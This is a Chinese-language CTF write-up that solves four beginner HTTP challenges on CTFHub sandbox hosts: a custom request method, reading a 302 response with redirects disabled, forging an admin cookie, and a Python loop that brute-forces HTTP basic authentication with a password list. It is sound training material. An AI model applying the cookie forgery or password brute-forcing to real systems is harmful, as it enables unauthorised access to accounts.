---
title: "ctf入门-http基础"
date: 2022-10-19T17:03:19+08:00
draft: false
tags: ["net"]
categories: 
- CTF
---

CTFHUB技能树的题目<br>
web-web前置技能-http协议
<!--more-->

---------

# 请求方式

## 题目

HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。<br>还给了一个url

## 解题过程

打开url后，显示如下：

> HTTP Method is GET Use CTF**B Method, I will give you flag.<br>
> Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.

发现是要用`CTFHUB`这个方法请求这个url

用py写如下代码：

```python
from urllib import request

req = request.Request(method='CTFHUB', url='http://challenge-7c8a21f5ac0bee47.sandbox.ctfhub.com:10080/index.php')
res = request.urlopen(req)
print(res.read())
```

返回了html文档，其中便有flag

# 302跳转

## 题目

HTTP临时重定向<br>依旧给了个url

## 解题过程

访问url，显示：

```html
<body>
		<center>
			<h1>No Flag here!</h1>
            <a href="index.php">Give me Flag</a>
		</center>
</body>
```

chrome抓包发现对index.php的请求302到了index.html~

利用python访问url并禁止跳转

```python
import requests

url = "http://challenge-2d971fb5ad995d8f.sandbox.ctfhub.com:10800/index.php"
req = requests.get(url=url, allow_redirects=False)
print(req.text)
```

# Cookie

## 题目

Cookie欺骗、认证、伪造<br>以及url

## 解题过程

访问url，提示：

> hello guest. only admin can get flag.

查看请求头，发现`Cookie: admin:0`,故而应该是请求时传入cookies

```python
import requests

url = "http://challenge-1ff467c75ff8e3e2.sandbox.ctfhub.com:10800"
req = requests.get(url=url, cookies={'admin':'1'})
print(req.text)
```

即可获得flag

# 基础认证

## 题目

在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP基本认证<br>常规给出url<br>一个录有100个密码的密码本

## 解题过程

通过终端`curl -v [url]`得到：

<img src="https://tvax4.sinaimg.cn/large/007Z9xVHgy1h7b143s60vj31dd0ql7wh.jpg" alt="http基本认证" width="1777" data-width="1777" data-height="957">

`www-authenticate` 那一行提示到用户名可能是 `admin`

写一个py遍历一下密码本：
```python
import requests

url = "http://challenge-153f9b191245ba0f.sandbox.ctfhub.com:10800/flag.html"
while (1):
    with open("10_million_password_list_top_100.txt", "r",
              encoding="utf-8") as f:
        for pwd in f.readlines():
            print(pwd.strip())
            req = requests.get(url, auth=('admin', pwd.strip()))
            if req.status_code != 401:
                print(req.text)
                break
        break
```

得到flag